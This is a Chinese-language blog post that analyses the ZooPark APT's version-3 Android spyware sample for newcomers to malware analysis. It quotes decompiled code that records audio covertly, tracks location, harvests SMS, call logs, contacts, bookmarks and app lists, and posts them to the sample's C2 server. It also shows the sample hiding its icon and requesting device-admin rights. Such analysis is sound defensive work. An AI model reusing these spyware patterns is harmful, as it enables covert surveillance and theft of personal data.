***本文作者：xiongchaochao，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

## 前言

**ZooPark是一个针对中东的APT组织，截至2017年，已经发展到了4.0版本，本次分析是第三个版本，相比较V1、V2版本的代码的复杂性，2016年流出的V3版本的样本可以说有关于信息窃取这方面的功能比之前有了质的飞跃，如果说之前两个版本让人感觉新手练手的作品，那么这个版本已经可以说是有开发经验的老司机来写的了。我们入门先做静态的代码分析，理顺分析流程。**

工具：JEB1.5、AndroidKiller1.3

## 样本运行流程图

![样本运行流程图](https://image.3001.net/images/20180927/1538015034_5bac3f3ab58d0.png!small)

## V3

分析之前，我们需要理清思路，逐步分析，慢慢行成一套属于自己的分析流程。

1、 是否加固过，混淆过未加固、未混淆。

2、看安装包目录结构，看是否有特别的文件，记录下来方便后面的分析。

证书信息，看样本大概流出的时间：

![证书信息](https://upload-images.jianshu.io/upload_images/13671484-2f44fbab20422763.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

资产目录assets中全是这些看起来很火辣的小姐姐，很明显可能用于诱惑用户查看点击之类的：

![诱惑用户查看点击](https://upload-images.jianshu.io/upload_images/13671484-b30f4f0df23efdec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

布局文件夹res的有几十个values文件（values-nb等），文件里面有不同国家的字体，和之前两个版本，可以看出，开发人员有了质的飞跃：

![不同国家的字体](https://upload-images.jianshu.io/upload_images/13671484-8975612abc0ebbef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

3、 看清单文件，静态注册了哪些广播接收器。

在清单文件AndroidManifest.xml中有这样静态注册的广播，因为它没有设置intent-filter，所以不会捕获任何广播，只能主动通过构造显式intent+发送广播sendBroadcast才可以唤醒这个广播：

    
    
          <receiver android:name="com.wallpaper.OnGPSReceiver" />
          <receiver android:name="com.wallpaper.OnAlarmReceiver" />

使用Android
Killer工具的全局字符串搜索，只发现OnAlarmReceiver这个广播接收器在OnBootReceiver开机广播中被启用，结合起来实现的功能是开机后，设置一个重复的警报，来启动这个广播，用来唤醒AppService服务（服务比较复杂，在分析完清单文件后，分析）：

![全局字符串搜索](https://upload-images.jianshu.io/upload_images/13671484-9bdc858e756983d0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

![全局字符串搜索](https://upload-images.jianshu.io/upload_images/13671484-628d488476205efa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

从广播接收器的名称就可以看出他是一个检测网络变化然后执行某些行为的广播。从代码中可以看出他的主要行为就是如果可以联网，就会开启AppService服务（这是第二个为了开启这个服务的广播了，可以看出极有可能这个服务就是恶意行为的主要发起者）。这里勾选上write方法是建议留个印象，如果分析多个样本，那么其实可以从代码编写习惯中，看出一些端倪：

    
    
    <receiver android:label="NetworkConnection" android:name="com.wallpaper.NetworkChangeReceiver">
              <intent-filter android:enabled="true" android:exported="false">
                  <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
              </intent-filter>
          </receiver>

![代码编写习惯](https://upload-images.jianshu.io/upload_images/13671484-69b1fdab71a1cc3a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

这是将这个样本APP激活成设备管理器，在meta-data中知道device_admin_sample.xml文件存放了，激活设备管理器请求开启的策略,并且一旦策略被触发就会调用这个广播接收器中重写的方法，如图7.png，都会打印一条日志：

    
    
          <intent-filter>
              <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
              <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
          </intent-filter>
          <meta-data android:name="android.app.device_admin" android:resource="@xml/device_admin_sample" />
      </receiver>

![打印一条日志](https://upload-images.jianshu.io/upload_images/13671484-15741fdf6a444249.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

收到短信时，会将短信内容、号码、时间等存入data数据库中的tbl_SMS表中：

    
    
     <receiver android:enabled="true" android:name="com.wallpaper.SMSReceivers">
                <intent-filter>
                    <action android:name="android.provider.Telephony.SMS_RECEIVED" />
                </intent-filter>
            </receiver>

![tbl_SMS表](https://upload-images.jianshu.io/upload_images/13671484-329162ea265a4dbd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

开机启动广播，首先会尝试开启ScreenStateService服务，然后创建一个重复的警报，每隔4分钟来启动这个OnAlarmReceiver，即开启AppService服务。

    
    
          <receiver android:enabled="true" android:name="com.wallpaper.OnBootReceiver" android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
              <intent-filter>
                  <action android:name="android.intent.action.BOOT_COMPLETED" />
                  <category android:name="android.intent.category.DEFAULT" />
              </intent-filter>
          </receiver>

综上，这些静态注册的广播，主要是通过监听网络变化、开机自启动来打开AppService、ScreenStateService服务，下面主要分析这两个服务。然后还有一些窃取用户收到的短信内容，写入数据库、激活设备管理器

4、分析两大服务的功能：AppService、ScreenStateService

### ScreenStateService

动态注册ScreenReceiver广播接收器来监听屏幕的解锁和锁屏：

    
    
              ScreenStateService.mReceiver = new ScreenReceiver();
              this.getApplicationContext().registerReceiver(ScreenStateService.mReceiver, new IntentFilter(
                      "android.intent.action.SCREEN_ON"));
              this.getApplicationContext().registerReceiver(ScreenStateService.mReceiver, new IntentFilter(
                      "android.intent.action.SCREEN_OFF"));

(1)
锁屏时，开启AppService服务（不知道第几次启动它，证明这个服务才是真正的恶意功能执行者）。执行Start_check_mic方法，开启线程来录音8分钟存储到外部存储/android/data/AndroidService/时间.3gpp，然后将~/android/data/AndroidService/目录下多有录音文件POST上传到C2地址的/spyMobile/recordcall_upload.php文件上：

![执行Start_check_mic方法](https://upload-images.jianshu.io/upload_images/13671484-44e3f40e9d365fde.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

在构造C2地址时，如果第一次访问这个地址MainActivity.Server_Domain，因为还没有被赋值，所以会异常，调用MainActivity.findServer()方法来，获取C2地址（通过访问网络图片获取返回的流数据，然后正则匹配出C2地址）：

![](https://upload-images.jianshu.io/upload_images/13671484-2e55f2fbc58d867a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

(2) 屏幕解锁时，打印Intent Action: android.intent.action.SCREEN_ON。

### AppService

一般来说，浏览服务做了哪些事，从onCreate或者onStartCommand（onCreate没有重写的情况），但是这个服务没有这两个方法，再仔细看看，发现这个服务类，继承一个自定义类，而这个自定义类继承IntentService类，看到这个类我们就需要从onHandleIntent方法入手了（解决开发这忘记开启线程和忘记调用
stopSelf()），发现主要执行了doWakefulWork抽象方法，所以再回到AppService类中，检查他的重写方法即可：

    
    
    public class AppService extends WakefulIntentService
    
    
    
    public abstract class WakefulIntentService extends IntentService
    ......
    abstract void doWakefulWork(Intent arg1);
    ......
              this.doWakefulWork(intent);
              WakefulIntentService.getLock(((Context)this)).release();  //锁屏（没有唤醒锁的前提）

(1) 检查是否开启ScreenStateService服务来偷偷录音，如果没有就打开这个服务：

![打开这个服务](https://upload-images.jianshu.io/upload_images/13671484-f947fc21760dc58b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

(2) GPS_GET_Location_Period: 获取设备位置信息强制开启GPS：

![强制开启GPS](https://upload-images.jianshu.io/upload_images/13671484-24d8b8a6bea2688f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

每秒检测一次，一旦距离改变超过15米，记录下经纬度和对应的位置：

![记录下经纬度和对应的位置](https://upload-images.jianshu.io/upload_images/13671484-8d3d10b34022c1d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

然后经纬度、时间数据写入这个tbl_GPS表中：

    
    
                    try {
                    label_38:
                        DatabaseHandlers v2 = new DatabaseHandlers(((Context)this));
                        v2.Insert_table("tbl_GPS", new String[]{"Lat", "Long", "Time"}, new String[]{Double
                                .toString(this.latitude), Double.toString(this.longitude), new SimpleDateFormat(
                                "yyy-MM-dd HH:mm:ss").format(new Date())});
                        v2.close();

(3) Start_All_Services()

### LoginUser

构造带有设备ID的url访问C2地址，如果没有C2地址，跟前面一样，使用findServer来获取（根据卡巴斯基的报告C2应该是5.61.27.157）：

![LoginUser](https://upload-images.jianshu.io/upload_images/13671484-57bc56d6ec942c9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

### GPSData

使用构造带有位置数据的C2地址，进行访问：

    
    
    //获取"tbl_GPS"表的所有数据
    v6 = v9.getAllData("tbl_GPS", v8);
    ......
            try {
                Object v18 = v6.get(v16);
                Object v20 = v6.get(v16 + 1);
                Object v23 = v6.get(v16 + 2);
                this.ConvertPointToLocation(Double.parseDouble(((String)v18)), Double.parseDouble(((String)
                        v20)));
                String v25 = MainActivity.Server_Domain + "/spyMobile/api_gpslocation.php?imei=" + devid
                         + "&ampcurrentLoaction=" + this.strAddress + "⪫_long=" + v20 + "," + v18 + "&timing="
                         + v23.replace(" ", "%20");
                Log.d("url", v25);
                v13.getParams().setParameter("http.protocol.cookie-policy", "rfc2109");
                v14 = new HttpPost(v25);
            }

### readOutgoingSMS

获取uri：content: //sms/sent内容，发送的短信内容，写入Insert_table表中：

    
    
            try {
                System.out.println("Inside of SMS Reading.......");
                v3 = Uri.parse("content://sms/sent");
                v4 = new String[]{"_id", "address", "body", "date"};
            }
    ......
                v16 = new DatabaseHandlers(this);
                v11 = new String[]{"Type", "Number", "Text", "Time"};
                v12 = 0;
    .......
            try {
                String[] v14 = new String[v2];
                v14[0] = "Outgoing";
                v14[1] = v8;
                v14[2] = v9;
                v14[3] = v21;
                v16.Insert_table("tbl_SMS", v11, v14);
                goto label_97;
            }

### SendSMS

上传发送的短信内容：

    
    
            try {
                String v20 = MainActivity.Server_Domain + "/spyMobile/api_smstracking.php?imei=" + devid
                         + "&smsType=" + v2.get(v14) + "&smsNumber=" + v2.get(v14 + 1) + "&smsText=" + v2
                        .get(v14 + 2) + "&smsTiming=" + v2.get(v14 + 3);
                Log.d("Send SMS url", v20);
                v20 = v20.replace(" ", "%20");
                v11.getParams().setParameter("http.protocol.cookie-policy", "rfc2109");
                v12 = new HttpPost(v20);
            }

### sendCallDetails

发送通话记录数据：

![发送通话记录数据](https://upload-images.jianshu.io/upload_images/13671484-2f77c26ee6700915.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

但是这里有一个问题就是，获取通话记录的地方也就是下面这个类没有被调用，那我们接着寻找一下fetchNewCallLogs方法的调用链，onCallStateChanged方法->fetchNewCallLogs，还是未能找到开启这个类的地方，先往下看：

    
    
    public class CustomPhoneStateListener extends PhoneStateListener {
    .........
        public static void fetchNewCallLogs(Context context) {
    ........
                    label_71:
                        Long v31 = Long.valueOf(Long.parseLong(v24));
                        Calendar v19 = Calendar.getInstance();
                        v19.setTimeInMillis(v31.longValue());
                        String v20 = v19.getTime().toString();
                        System.out.println("tbl_CALL TIMING : " + v20);
                        v25.Insert_table("tbl_CALL", v22, new String[]{v30, v21, v26, v20});
                        v18.moveToNext();

### ScreenReceiver.upload_all_file_and_delete()

上传ScreenStateService服务录的音频文件：

![上传ScreenStateService服务录的音频文件](https://upload-images.jianshu.io/upload_images/13671484-b00e6a3dbbfeaaed.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

### SendPhoneBook

获取联系人电话、姓名、ID并发送：

![SendPhoneBook](https://upload-images.jianshu.io/upload_images/13671484-6d7834ab40d8a0c2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

    
    
            try {
                String v10 = MainActivity.Server_Domain + "/spyMobile/api_phonebookaccess.php?imei=" + devid
                         + "&phonebookListname=" + this.PhoneBookName.get(v5) + "&mobileNumber=" + this.
                        PhoneBookNo.get(v5) + "&numberType=" + this.PhoneBookType.get(v5);
                Log.d(" phonebook url", v10);
                v10 = v10.replace(" ", "");
                v2.getParams().setParameter("http.protocol.cookie-policy", "rfc2109");
                v3 = new HttpPost(v10);
            }

### SendBrowserDetails_GetLastTime

第一次执行到Start_All_Services()方法时，count_step_to_send_BrowserHistory
变量还是初值1，不能执行SendBrowserDetails_GetLastTime恶意方法，第一次主要是赋值AppService.check_start_upload_info
== true，标识开始上传数据：

    
    
    public AppService() {
    ........
    this.count_step_to_send_BrowserHistory = 1;
    .......
                if(this.count_step_to_send_BrowserHistory != 0) {
                    goto label_108;
                }
    ......
                // first: count_step_to_send_BrowserHistory == 2；second：count_step_to_send_BrowserHistory == 3（V14）
                ++this.count_step_to_send_BrowserHistory;  
                if(this.count_step_to_send_BrowserHistory != v14) {
                    goto label_115;
                }
     this.count_step_to_send_BrowserHistory = 0;

第二次执行到这时，看上边代码的注释，会给count_step_to_send_BrowserHistory
赋值为0，也就是第三次执行到这里就可以执行SendBrowserDetails_GetLastTime方法了，执行了普通的HTTP请求，来获取访问的时间信息：

    
    
            try {
                String v9 = MainActivity.Server_Domain + "/spyMobile/api_urltracking.php?imei=" + devid + 
                        "&urlName=" + "getlasttime" + "&urlLink=a&timing=a".replace(" ", "%20");
                Log.d("Browser url ", v9);
                v2.getParams().setParameter("http.protocol.cookie-policy", "rfc2109");
                v4 = new HttpPost(v9);
            }

获取浏览器书签：

![获取浏览器书签](https://upload-images.jianshu.io/upload_images/13671484-fcc3991a4704b4ee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

### SendBrowserDetails

发送系统自带浏览器书签信息到C2：

![发送系统自带浏览器书签信息到C2](https://upload-images.jianshu.io/upload_images/13671484-edbf53a272d85400.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

    
    
            try {
                String v10 = MainActivity.Server_Domain + "/spyMobile/api_urltracking.php?imei=" + devid
                         + "&urlName=" + this.UrlName.get(v5) + "&urlLink=" + this.UrlLink.get(v5) + "&timing="
                         + this.UrlTime.get(v5).replace(" ", "%20");
                Log.d("Browser url ", v10);
                v2.getParams().setParameter("http.protocol.cookie-policy", "rfc2109");
                v3 = new HttpPost(v10);
            }
    

### readAppInfo  

第三次执行到这会被赋0值，然后第四次执行this.readAppInfo()，

    
    
            try {
                if(this.count_step_to_send_AppInfo == 0) {
                    this.readAppInfo();
                    this.SendAppInfo(AppService.deviceIMEI);
                }
    
                ++this.count_step_to_send_AppInfo;  // this.count_step_to_send_AppInfo初始化之后为2，现在==3
                if(this.count_step_to_send_AppInfo != 5) {
                    goto label_130;
                }
    
                this.count_step_to_send_AppInfo = 0;
            }

获取已经安装的应用的名称包名：

    
    
                v5 = this.getPackageManager();
                List v1 = v5.getInstalledApplications(0);

### SendAppInfo

构造含有应用信息的url，发送给C2：

    
    
                    try {
                        v2.printStackTrace();
                    label_18:
                        String v13 = MainActivity.Server_Domain + "/spyMobile/api_appinfo.php?imei=" + devid
                                 + "&appinfo=" + this.AppInfo.get(v7) + "&isappexist=" + this.AppIsExist
                                .get(v7);
                        Log.d("Send appinfo url", v13);
                        v13 = v13.replace(" ", "%20");
                        v4.getParams().setParameter("http.protocol.cookie-policy", "rfc2109");
                        v5 = new HttpPost(v13);
                    }

### getSentImages、sendImageData

首先同上，它这里有个明显的失误，因为初始值为1，之后会不断增加，即使重新启动这个类，也会再++this.count_step_to_send_Image;这里自增，永远不会为1，也就是永远不会被赋值为0，执行不到getSentImages和sendImageData（这里经过全局查询字符串，并没有其他地方会赋值），也就是说它这个上传外部存储下的/DCIM/目录，关于设备拍的照片、截屏还有隐藏文件夹"/DCIM/.thumbnails"内的图片缩略图，写入数据库的"tbl_PHOTO"表后的上传操作，都不能进行了。

    
    
                if(this.count_step_to_send_Image == 0) {
                    this.getSentImages();
                    this.sendImageData(AppService.deviceIMEI);
                }
    
                ++this.count_step_to_send_Image;  // count_step_to_send_Image初始值==1，第一次执行到这，==2
                if(this.count_step_to_send_Image != 1) {
                    goto label_145;
                }
                this.count_step_to_send_Image = 0;

至此关于AndroidManifest.xml中会进行的操作分析完毕了，主要的恶意功能服务AppService也分析完了，过程中发现，样本作者开发过程中，出现了失误导致上传图片功能无法进行，好像是借鉴另一个样本家族的源码写的，但是没有做个精确测试，导致的问题吧（如果错误，请指教！！！），还有就是留下一个没有获取通话记录的地方，接下来，分析主要的启动过程中，会感谢什么，也是比较轻松一些得了，因为主要恶意功能已经分析完毕

5、清单文件中找入口类

### com.wallpaper.MainActivity

    
    
            <activity android:alwaysRetainTaskState="true" android:label="@string/title_activity_main" android:name="com.wallpaper.MainActivity">
                <intent-filter>
                    <action android:name="android.intent.action.MAIN" />//标志
                    <category android:name="android.intent.category.LAUNCHER" />//标志
                </intent-filter>
            </activity>

### MainActivity()

在构造函数里声明了一个延迟开启AppService服务的死循环操作(看onCreate之前先看看构造函数中是否有一些恶意行为，或者可以直接执行的操作)：

    
    
            this.updateTimerThread = new Runnable() {
                public void run() {
                    try {
                        Intent v0 = new Intent(MainActivity.this.context, AppService.class);
                        v0.addFlags(0x14000000);
                        MainActivity.this.context.startService(v0);
                        // 延迟4分钟，继续执行这个操作（死循环）
                        MainActivity.Handler_schedul.postDelayed(MainActivity.this.updateTimerThread, 240000);  
                    }
                    catch(Exception v1) {
                    }

### onCreate()

### m1

(1) 延迟1分钟开始死循环，不断开启AppService服务

    
    
    MainActivity.Handler_schedul.postDelayed(this.updateTimerThread, 60000);

(2) this.readSMS(); //获取短信数据，写入tbl_SMS表里

    
    
            Uri v3 = Uri.parse("content://sms/");
            String[] v4 = new String[]{"_id", "address", "body", "date", "type"};
    .......
              v21 = "Incoming";
                switch(Integer.parseInt(v12.getString(v12.getColumnIndex("type")))) {
                    case 1: {
                        try {
                            v21 = "Incoming";    //收到的短信
                            goto label_69;
                        label_109:
                            v21 = "Outgoing";    //发送的短信
                            goto label_69;
                        label_111:
                            v21 = "Draft";        //草稿
                            goto label_69;
                        }
    ......
                v15.Insert_table("tbl_SMS", v11, v13);

(3) 获取通话记录数据放入tbl_CALL表中，补充了分析AppService中遗留的问题

### this.getCallDetails();

    
    
                v27 = this.getContentResolver().query(CallLog$Calls.CONTENT_URI, null, null, null, null);
                v28 = v27.getColumnIndex("number");
                v34 = v27.getColumnIndex("type");
                v20 = v27.getColumnIndex("date");
                v24 = v27.getColumnIndex("duration");
                v30.append("Call Details :");
    ........
                v21.Insert_table("tbl_CALL", v18, v19);

(4) 使用registerReceiver动态注册屏幕开关广播接收器ScreenReceiver（上面分析过了，这里不赘述）

    
    
            try {
                IntentFilter v5 = new IntentFilter("android.intent.action.CLOSE_SYSTEM_DIALOGS");
                v5.setPriority(65535);
                v5.addAction("android.intent.action.SCREEN_OFF");
                v5.addAction("android.intent.action.SCREEN_ON");
                this.mReceiver = new ScreenReceiver();
                this.registerReceiver(this.mReceiver, v5);
            }

(5) 申请激活设备管理器

    
    
                //设备策略管理服务
                this.getSystemService("device_policy");
                //监听策略被触发，调用重写的方法
                ComponentName v1 = new ComponentName(((Context)this), AdminReceiver.class);
                //添加设备管理员意图(main)
                Intent v4 = new Intent("android.app.action.ADD_DEVICE_ADMIN");
                v4.putExtra("android.app.extra.DEVICE_ADMIN", ((Parcelable)v1));
                //额外的解释，随便写的内容
                v4.putExtra("android.app.extra.ADD_EXPLANATION", "Your boss told you to do this");

隐藏图标:

    
    
                this.getPackageManager().setComponentEnabledSetting(new ComponentName(appPackage, appPackage
                         + ".MainActivity"), 2, 1);

分析到这里基本完整的分析完了第三版本的样本。

## 总结

作为一个刚入行的新人，在分析病毒木马上，可以比较细致的去分析，分析过程中一定要作笔记记录分析过程，方便之后总结回顾，碰见不会的API，推荐先查官网的介绍，一点点看，很锻炼英文水准，且结合网上的一些总结来熟悉，然后尝试脱壳、反混淆、动态调试，慢慢熟悉整个分析过程，分析过程中也可以多接触一些溯源的工作，最终要做到出现新的病毒样本，可以实现快速的分析、溯源（流量分析也是溯源取证的方法），后面甚至可以看看android源码，更深入的了解底层知识，进阶一些漏洞挖掘的工作（个人初步想法）。

第一行代码熟悉android开发，基本没有加壳的样本没问题了

ARM汇编基础：为动态调试做准备.....

 ***本文作者：xiongchaochao，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

